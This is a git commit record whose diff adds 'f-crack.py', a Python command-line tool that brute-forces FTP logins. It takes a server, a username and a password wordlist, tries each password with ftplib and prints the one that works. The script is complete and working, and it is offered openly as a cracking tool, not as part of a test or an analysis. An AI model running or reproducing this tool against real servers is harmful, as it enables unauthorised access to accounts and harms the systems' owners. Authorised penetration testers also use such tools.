d8aa54de68fafca561bf0ecb79827a17b8b08c2d
CyberVarun <varunjagtap424@gmail.com>
2022-02-03 17:03:07 +0530

    Renamed crack.py into f-crack.py

---
+++ f-crack.py
@@ -0,0 +1,54 @@
+#!/usr/bin/env python3
+
+import sys
+import ftplib
+import typer
+
+VERSION = 'v1.1'
+
+LOGO = '''
+ ______ _______ _____   _____ _____            _____ _  ________ _____  
+|  ____|__   __|  __ \ / ____|  __ \     /\   / ____| |/ /  ____|  __ \ 
+| |__     | |  | |__) | |    | |__) |   /  \ | |    | ' /| |__  | |__) |
+|  __|    | |  |  ___/| |    |  _  /   / /\ \| |    |  < |  __| |  _  / 
+| |       | |  | |    | |____| | \ \  / ____ \ |____| . \| |____| | \ \ 
+|_|       |_|  |_|     \_____|_|  \_\/_/    \_\_____|_|\_\______|_|  \_\ '''
+
+CREDITS = '		  \033[1;34mCreated by @CyberVarun (https://github.com/CyberVarun)\033[0m'
+
+
+def crack(server, user, passfile):
+	"""
+	# TODO: write docstring
+	"""
+	for password in passfile:
+		try:
+			password = password.strip()
+			typer.secho(f"trying: {password}", fg=typer.colors.GREEN)
+
+			ftp = ftplib.FTP(server)
+			if ftp.login(user, password):
+				typer.secho(f"Password Found: {password}", fg=typer.colors.BRIGHT_GREEN)
+				exit() # TODO: use typer.Exit() or typer.Abort() to exit
+
+		except Exception as e:
+			# TODO: handle connection not established
+			typer.secho(f"Login Incorrect", fg=typer.colors.RED)
+
+def main(
+	server: str = typer.Option(..., '--server', '-s', help="Specify Server IP"),
+	user: str = typer.Option(..., '--user', '-u', help="Specify User"),
+	passfile: typer.FileText = typer.Option(..., '--passfile', '-p', help="Specify Password File"),
+):
+	"""
+	This Simple python FTP cracker to crack FTP login using wordlist based brute force attack.
+	"""
+	typer.clear()  # clear the screen 
+	# print logo and cretids
+	typer.secho(LOGO + VERSION, fg=typer.colors.BRIGHT_CYAN)
+	typer.echo(CREDITS)  
+
+	crack(server, user, passfile)
+
+if __name__ == '__main__':
+	typer.run(main)
